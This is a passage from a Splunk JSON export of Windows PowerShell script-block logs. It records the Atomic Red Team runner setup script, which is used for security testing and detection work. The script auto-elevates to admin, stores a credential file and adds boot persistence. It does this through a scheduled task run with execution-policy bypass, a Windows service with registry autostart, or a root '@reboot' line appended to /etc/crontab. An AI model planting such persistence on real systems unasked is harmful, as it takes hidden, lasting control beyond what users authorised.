$artConfig.runnerFolder -ErrorAction Ignore\r\n\r\n    if ($artConfig.OS -eq \"windows\") {\r\n        if ($asScheduledtask) {\r\n            if (Test-Path $artConfig.credFile) {\r\n                Write-Host \"Credential File $($artConfig.credFile) already exists, not prompting for creation of a new one.\"\r\n                $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $artConfig.user, (Get-Content $artConfig.credFile | ConvertTo-SecureString)\r\n            }\r\n            else {\r\n                # create credential file for the user since we aren't using a group managed service account\r\n                $cred = Get-Credential -UserName $artConfig.user -message \"Enter password for $($artConfig.user) in order to create the runner scheduled task\"\r\n                $cred.Password | ConvertFrom-SecureString | Out-File $artConfig.credFile\r\n            }\r\n            # setup scheduled task that will start the runner after each restart\r\n            # local security policy --&gt; Local Policies --&gt; Security Options --&gt; Network access: Do not allow storage of passwords and credentials for network authentication must be disabled\r\n            $taskName = \"KickOff-AtomicRunner\"\r\n            Unregister-ScheduledTask $taskName -confirm:$false -ErrorAction Ignore\r\n            # Windows scheduled task includes a 20 minutes sleep then restart if the call to Invoke-KickoffAtomicRunner fails\r\n            # this occurs occassionally when Windows has issues logging into the runner user's account and logs in as a TEMP user\r\n            $taskAction = New-ScheduledTaskAction -Execute \"powershell.exe\" -Argument \"-exec bypass -Command Invoke-KickoffAtomicRunner; Start-Sleep 1200; Restart-Computer -Force\"\r\n            $taskPrincipal = New-ScheduledTaskPrincipal -UserId $artConfig.user\r\n            $delays = @(1, 2, 4, 8, 16, 32, 64) # using multiple triggers as a retry mechanism because the built-in retry mechanism doesn't work when the computer renaming causes AD replication delays\r\n            $triggers = @()\r\n            foreach ($delay in $delays) {\r\n                $trigger = New-ScheduledTaskTrigger -AtStartup\r\n                $trigger.Delay = \"PT$delay`M\"\r\n                $triggers += $trigger\r\n            }\r\n            $task = New-ScheduledTask -Action $taskAction -Principal $taskPrincipal -Trigger $triggers -Description \"A task that runs 1 minute or later after boot to start the atomic test runner script\"\r\n            try {\r\n                $null = Register-ScheduledTask -TaskName $taskName -InputObject $task -User $artConfig.user -Password $($cred.GetNetworkCredential().password) -ErrorAction Stop\r\n            }\r\n            catch {\r\n                if ($_.CategoryInfo.Category -eq \"AuthenticationError\") {\r\n                    # remove the credential file if the password didn't work\r\n                    Write-Error \"The credentials you entered are incorrect. Please run the setup script again and double check the username and password.\"\r\n                    Remove-Item $artConfig.credFile\r\n                }\r\n                else {\r\n                    Throw $_\r\n                }\r\n            }\r\n\r\n            # remove the atomicrunnerservice now that we are using a scheduled task instead\r\n            . \"$PSScriptRoot\\AtomicRunnerService.ps1\" -Remove\r\n        }\r\n        elseif (-not $SkipServiceSetup) {\r\n            # create the service that will start the runner after each restart\r\n            # The user must have the \"Log on as a service\" right. To add that right, open the Local Security Policy management console, go to the\r\n            # \"\\Security Settings\\Local Policies\\User Rights Assignments\" folder, and edit the \"Log on as a service\" policy there.\r\n            . \"$PSScriptRoot\\AtomicRunnerService.ps1\" -Remove\r\n            . \"$PSScriptRoot\\AtomicRunnerService.ps1\" -UserName $artConfig.user -installDir $artConfig.serviceInstallDir -Setup\r\n            Add-EnvPath -Container Machine -Path $artConfig.serviceInstallDir\r\n            # set service start retry options\r\n            $ServiceDisplayName = \"AtomicRunnerService\"\r\n            $action1, $action2, $action3 = \"restart\"\r\n            $time1 = 600000 # 10 minutes in miliseconds\r\n            $action2 = \"restart\"\r\n            $time2 = 600000 # 10 minutes in miliseconds\r\n            $actionLast = \"restart\"\r\n            $timeLast = 3600000 # 1 hour in miliseconds\r\n            $resetCounter = 86400 # 1 day in seconds\r\n            $services = Get-CimInstance -ClassName 'Win32_Service' | Where-Object { $_.DisplayName -imatch $ServiceDisplayName }\r\n            $action = $action1 + \"/\" + $time1 + \"/\" + $action2 + \"/\" + $time2 + \"/\" + $actionLast + \"/\" + $timeLast\r\n            foreach ($service in $services) {\r\n                # https://technet.microsoft.com/en-us/library/cc742019.aspx\r\n                $output = sc.exe  failure $($service.Name) actions= $action reset= $resetCounter\r\n            }\r\n            # set service to delayed auto-start (doesn't reflect in the services console until after a reboot)\r\n            Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\AtomicRunnerService\" -Name Start -Value 2\r\n            Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\AtomicRunnerService\" -Name DelayedAutostart -Value 1\r\n\r\n            # remove scheduled task now that we are using a service instead\r\n            Unregister-ScheduledTask \"KickOff-AtomicRunner\" -confirm:$false -ErrorAction Ignore\r\n        }\r\n    }\r\n    else {\r\n        # sets cronjob string using basepath from config.ps1\r\n        $pwshPath = which pwsh\r\n        $job = \"@reboot root sleep 60;$pwshPath -Command Invoke-KickoffAtomicRunner\"\r\n        $exists = cat /etc/crontab | Select-String -Quiet \"KickoffAtomicRunner\"\r\n        #checks if the Kickoff-AtomicRunner job exists. If not appends it to the system crontab.\r\n        if ($null -eq $exists) {\r\n            $(Write-Output \"$job\" &gt;&gt; /etc/crontab)\r\n            write-host \"setting cronjob\"\r\n        }\r\n        else {\r\n            write-host \"cronjob already exists\"\r\n        }\r\n    }\r\n\r\n    # Add Import-Module statement to the PowerShell profile\r\n    $root = Split-Path $PSScriptRoot -Parent\r\n    $pathToPSD1 = Join-Path $root \"Invoke-AtomicRedTeam.psd1\"\r\n    $importStatement = \"Import-Module \"\"$pathToPSD1\"\" -Force\"\r\n    $profileFolder = Split-Path $profile\r\n    New-Item -ItemType Directory -Force -Path $profileFolder | Out-Null\r\n    New-Item $PROFILE -ErrorAction Ignore\r\n    $profileContent = Get-Content $profile\r\n    $line = $profileContent | Select-String \".*import-module.*invoke-atomicredTeam.psd1\" | Select-Object -ExpandProperty Line\r\n    if ($line) {\r\n        $profileContent | ForEach-Object { $_.replace( $line, \"$importStatement\") } | Set-Content $profile\r\n    }\r\n    else {\r\n        Add-Content $profile $importStatement\r\n    }\r\n\r\n    # Install the Posh-SYLOG module if we are configured to use it and it is not already installed\r\n    if ((-not (Get-Module -ListAvailable \"Posh-SYSLOG\")) -and [bool]$artConfig.syslogServer -and [bool]$artConfig.syslogPort) {\r\n        write-verbose \"Posh-SYSLOG\"\r\n        Install-Module -Name Posh-SYSLOG -Scope CurrentUser -Force\r\n    }\r\n\r\n    # create the CSV schedule of atomics to run if it doesn't exist\r\n    if (-not (Test-Path $artConfig.scheduleFile)) {\r\n        Invoke-GenerateNewSchedule\r\n    }\r\n\r\n    $schedule = Get-Schedule\r\n    if ($null -eq $schedule) {\r\n        Write-Host -ForegroundColor Yellow \"There are no tests enabled on the schedule, set the 'Enabled' column to 'True' for the atomic test that you want to run. The schedule file is found here: $($artConfig.scheduleFile)\"\r\n        Write-Host -ForegroundColor Yellow \"Rerun this setup script after updating the schedule\"\r\n    }\r\n    else {\r\n        # Get the prereqs for all of the tests on the schedule\r\n        Invoke-AtomicRunner -GetPrereqs\r\n    }\r\n}\r\n\r\n# Add-EnvPath from https://gist.github.com/mkropat/c1226e0cc2ca941b23a9\r\nfunction Add-EnvPath {\r\n    param(\r\n        [Parameter(Mandatory = $true)]\r\n        [string] $Path,\r\n\r\n        [ValidateSet('Machine', 'User', 'Session')]\r\n        [string] $Container = 'Session'\r\n    )\r\n\r\n    if ($Container -ne 'Session') {\r\n        $containerMapping = @{\r\n            Machine = [EnvironmentVariableTarget]::Machine\r\n            User    = [EnvironmentVariableTarget]::User\r\n        }\r\n        $containerType = $containerMapping[$Container]\r\n\r\n        $persistedPaths = [Environment]::GetEnvironmentVariable('Path', $containerType) -split ';'\r\n        if ($persistedPaths -notcontains $Path) {\r\n            $persistedPaths = $persistedPaths + $Path | Where-Object { $_ }\r\n            [Environment]::SetEnvironmentVariable('Path', $persistedPaths -join ';', $containerType)\r\n        }\r\n    }\r\n\r\n    $envPaths = $env:Path -split ';'\r\n    if ($envPaths -notcontains $Path) {\r\n        $envPaths = $envPaths + $Path | Where-Object { $_ }\r\n        $env:Path = $envPaths -join ';'\r\n    }\r\n}</Data><Data Name='ScriptBlockId'>77a1b1c4-6225-416a-b9f5-08cf86ff25dd</Data><Data Name='Path'>C:\\AtomicRedTeam\\invoke-atomicredteam\\Public\\Invoke-SetupAtomicRunner.ps1</Data>",
      "EventID": "4104",
      "ScriptBlockText": "function Invoke-SetupAtomicRunner {\r\n\r\n    [CmdletBinding(\r\n        SupportsShouldProcess = $true,\r\n        PositionalBinding = $false,\r\n        ConfirmImpact = 'Medium')]\r\n    Param(\r\n        [Parameter(Mandatory = $false)]\r\n        [switch]\r\n        $SkipServiceSetup,\r\n\r\n        [Parameter(Mandatory = $false)]\r\n        [switch]\r\n        $asScheduledtask\r\n    )\r\n\r\n    # ensure running with admin privs\r\n    if ($artConfig.OS -eq \"windows\") {\r\n        # auto-elevate on Windows\r\n        $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())\r\n        $testadmin = $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)\r\n        if ($testadmin -eq $false) {\r\n            Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -noexit -file \"{0}\" -elevated' -f ($myinvocation.MyCommand.Definition))\r\n            exit $LASTEXITCODE\r\n        }\r\n    }\r\n    else {\r\n        # linux and macos check - doesn't auto-elevate\r\n        if ((id -u) -ne 0 ) {\r\n            Throw \"You must run the Invoke-SetupAtomicRunner script as root\"\r\n            exit\r\n        }\r\n    }\r\n\r\n    if ($artConfig.basehostname.length -gt 15) { Throw \"The hostname for this machine (minus the GUID) must be 15 characters or less. Please rename this computer.\" }\r\n\r\n    #create AtomicRunner-Logs directories if they don't exist\r\n    New-Item -ItemType Directory $artConfig.atomicLogsPath -ErrorAction Ignore\r\n    New-Item -ItemType Directory $artConfig.runnerFolder -ErrorAction Ignore\r\n\r\n    if ($artConfig.OS -eq \"windows\") {\r\n        if ($asScheduledtask) {\r\n            if (Test-Path $artConfig.credFile) {\r\n                Write-Host \"Credential File $($artConfig.credFile) already exists, not prompting for creation of a new one.\"\r\n                $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $artConfig.user, (Get-Content $artConfig.credFile | ConvertTo-SecureString)\r\n            }\r\n            else {\r\n                # create credential file for the user since we aren't using a group managed service account\r\n                $cred = Get-Credential -UserName $artConfig.user -message \"Enter password for $($artConfig.user) in order to create the runner scheduled task\"\r\n                $cred.Password | ConvertFrom-SecureString | Out-File $artConfig.credFile\r\n            }\r\n            # setup scheduled task that will start the runner after each restart\r\n            # local security policy --&gt; Local Policies --&gt; Security Options --&gt; Network access: Do not allow storage of passwords and credentials for network authentication must be disabled\r\n            $taskName = \"KickOff-AtomicRunner\"\r\n            Unregister-ScheduledTask $taskName -confirm:$false -ErrorAction Ignore\r\n            # Windows scheduled task includes a 20 minutes sleep then restart if the call to Invoke-KickoffAtomicRunner fails\r\n            # this occurs occassionally when Windows has issues logging into the runner user's account and logs in as a TEMP user\r\n            $taskAction = New-ScheduledTaskAction -Execute \"powershell.exe\" -Argument \"-exec bypass -Command Invoke-KickoffAtomicRunner; Start-Sleep 1200; Restart-Computer -Force\"\r\n            $taskPrincipal = New-ScheduledTaskPrincipal -UserId $artConfig.user\r\n            $delays = @(1, 2, 4, 8, 16, 32, 64) # using multiple triggers as a retry mechanism because the built-in retry mechanism doesn't work when the computer renaming causes AD replication delays\r\n            $triggers = @()\r\n            foreach ($delay in $delays) {\r\n                $trigger = New-ScheduledTaskTrigger -AtStartup\r\n                $trigger.Delay = \"PT$delay`M\"\r\n                $triggers += $trigger\r\n            }\r\n            $task = New-ScheduledTask -Action $taskAction -Principal $taskPrincipal -Trigger $triggers -Description \"A task that runs 1 minute or later after boot to start the atomic test runner script\"\r\n            try {\r\n                $null = Register-ScheduledTask -TaskName $taskName -InputObject $task -User $artConfig.user -Password $($cred.GetNetworkCredential().password) -ErrorAction Stop\r\n            }\r\n            catch {\r\n                if ($_.CategoryInfo.Category -eq \"AuthenticationError\") {\r\n                    # remove the credential file if the password didn't work\r\n                    Write-Error \"The credentials you entered are incorrect. Please run the setup script again and double check the username and password.\"\r\n                    Remove-Item $artConfig.credFile\r\n                }\r\n                else {\r\n                    Throw $_\r\n                }\r\n            }\r\n\r\n            # remove the atomicrunnerservice now that we are using a scheduled task instead\r\n            . \"$PSScriptRoot\\AtomicRunnerService.ps1\" -Remove\r\n        }\r\n        elseif (-not $SkipServiceSetup) {\r\n            # create the service that will start the runner after each restart\r\n            # The user must have the \"Log on as a service\" right. To add that right, open the Local Security Policy management console, go to the\r\n            # \"\\Security Settings\\Local Policies\\User Rights Assignments\" folder, and edit the \"Log on as a service\" policy there.\r\n            . \"$PSScriptRoot\\AtomicRunnerService.ps1\" -Remove\r\n            . \"$PSScriptRoot\\AtomicRunnerService.ps1\" -UserName $artConfig.user -installDir $artConfig.serviceInstallDir -Setup\r\n            Add-EnvPath -Container Machine -Path $artConfig.serviceInstallDir\r\n            # set service start retry options\r\n            $ServiceDisplayName = \"AtomicRunnerService\"\r\n            $action1, $action2, $action3 = \"restart\"\r\n            $time1 = 600000 # 10 minutes in miliseconds\r\n            $action2 = \"restart\"\r\n            $time2 = 600000 # 10 minutes in miliseconds\r\n            $actionLast = \"restart\"\r\n            $timeLast = 3600000 # 1 hour in miliseconds\r\n            $resetCounter = 86400 # 1 day in seconds\r\n            $services = Get-CimInstance -ClassName 'Win32_Service' | Where-Object { $_.DisplayName -imatch $ServiceDisplayName }\r\n            $action = $action1 + \"/\" + $time1 + \"/\" + $action2 + \"/\" + $time2 + \"/\" + $actionLast + \"/\" + $timeLast\r\n            foreach ($service in $services) {\r\n                # https://technet.microsoft.com/en-us/library/cc742019.aspx\r\n                $output = sc.exe  failure $($service.Name) actions= $action reset= $resetCounter\r\n            }\r\n            # set service to delayed auto-start (doesn't reflect in the services console until after a reboot)\r\n            Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\AtomicRunnerService\" -Name Start -Value 2\r\n            Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\AtomicRunnerService\" -Name DelayedAutostart -Value 1\r\n\r\n            # remove scheduled task now that we are using a service instead\r\n            Unregister-ScheduledTask \"KickOff-AtomicRunner\" -confirm:$false -ErrorAction Ignore\r\n        }\r\n    }\r\n    else {\r\n        # sets cronjob string using basepath from config.ps1\r\n        $pwshPath = which pwsh\r\n        $job = \"@reboot root sleep 60;$pwshPath -Command Invoke-KickoffAtomicRunner\"\r\n        $exists = cat /etc/crontab | Select-String -Quiet \"KickoffAtomicRunner\"\r\n        #checks if the Kickoff-AtomicRunner job exists. If not appends it to the system crontab.\r\n        if ($null -eq $exists) {\r\n            $(Write-Output \"$job\" &gt;&gt; /etc/crontab)\r\n            write-host \"setting cronjob\"\r\n        }\r\n        else {\r\n            write-host \"cronjob already exists\"\r\n        }\r\n    }\r\n\r\n    # Add Import-Module statement to the PowerShell profile\r\n    $root = Split-Path $PSScriptRoot -Parent\r\n    $pathToPSD1 = Join-Path $root \"Invoke-AtomicRedTeam.psd1\"\r\n    $importStatement = \"Import-Module \"\"$pathToPSD1\"\" -Force\"\r\n    $profileFolder = Split-Path $profile\r\n    New-Item -ItemType Directory -Force -Path $profileFolder | Out-Null\r\n    New-Item $PROFILE -ErrorAction Ignore\r\n    $profileContent = Get-Content $profile\r\n    $line = $profileContent | Select-String \".*import-module.*invoke-atomicredTeam.psd1\" | Select-Object -ExpandProperty Line\r\n    if ($line) {\r\n        $profileContent | ForEach-Object { $_.replace( $line, \"$importStatement\") } | Set-Content $profile\r\n    }\r\n    else {\r\n        Add-Content $profile $importStatement\r\n    }\r\n\r\n    # Install the Posh-SYLOG module if we are configured to use it and it is not already installed\r\n    if ((-not (Get-Module -ListAvailable \"Posh-SYSLOG\")) -and [bool]$artConfig.syslogServer -and [bool]$artConfig.syslogPort) {\r\n        write-verbose \"Posh-SYSLOG\"\r\n        Install-Module -Name Posh-SYSLOG -Scope CurrentUser -Force\r\n    }\r\n\r\n    # create the CSV schedule of atomics to run if it doesn't exist\r\n    if (-not (Test-Path $artConfig.scheduleFile)) {\r\n        Invoke-GenerateNewSchedule\r\n    }\r\n\r\n    $schedule = Get-Schedule\r\n    if ($null -eq $schedule) {\r\n        Write-Host -ForegroundColor Yellow \"There are no tests enabled on the schedule, set the 'Enabled' column to 'True' for the atomic test that you want to run. The schedule file is found here: $($artConfig.scheduleFile)\"\r\n        Write-Host -ForegroundColor Yellow \"Rerun this setup script after updating the schedule\"\r\n    }\r\n    else {\r\n        # Get the prereqs for all of the tests on the schedule\r\n        Invoke-AtomicRunner -GetPrereqs\r\n    }\r\n}\r\n\r\n# Add-EnvPath from https://gist.github.com/mkropat/c1226e0cc2ca941b23a9\r\nfunction Add-EnvPath {\r\n    param(\r\n        [Parameter(Mandatory = $true)]\r\n        [string] $Path,\r\n\r\n        [ValidateSet('Machine', 'User', 'Session')]\r\n        [string] $Container = 'Session'\r\n    )\r\n\r\n    if ($Container -ne 'Session') {\r\n        $containerMapping = @{\r\n            Machine = [EnvironmentVariableTarget]::Machine\r\n            User    = [EnvironmentVariableTarget]::User\r\n        }\r\n        $containerType = $containerMapping[$Container]\r\n\r\n        $persistedPaths = [Environment]::GetEnvironmentVariable('Path', $containerType) -split ';'\r\n        if ($persistedPaths -notcontains $Path) {\r\n            $persistedPaths = $persistedPaths + $Path | Where-Object { $_ }\r\n            [Environment]::SetEnvironmentVariable('Path', $persistedPaths -join ';', $containerType)\r\n        }\r\n    }\r\n\r\n    $envPaths = $env:Path -split ';'\r\n    if ($envPaths -notcontains $Path) {\r\n        $envPaths = $envPaths + $Path | Where-Object { $_ }\r\n        $env:Path = $envPaths -join ';'\r\n    }\r\n}",
      "System_Props_Xml": "<Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4104</EventID><Version>1</Version><Level>3</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2026-08-11T06:28:53.9371660Z'/><EventRecordID>1092056</EventRecordID><Correlation ActivityID='{8eacc285-28cf-000a-6131-c38ecf28dd01}'/><Execution ProcessID='49016' ThreadID='60312'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>Ayush</Computer><Security UserID='S-1-5-21-4283746528-2832981674-120407787-1001'/>",
      "host": "Ayush",
      "index": "windows",
      "linecount": "197",
      "source": "XmlWinEventLog:Microsoft-Windows-PowerShell/Operational",
      "sourcetype": "XmlWinEventLog",
      "splunk_server": "Ayush",
      "_time": "2026-08-11T06:28:53.937Z"
    }
  ],
  "4648": [
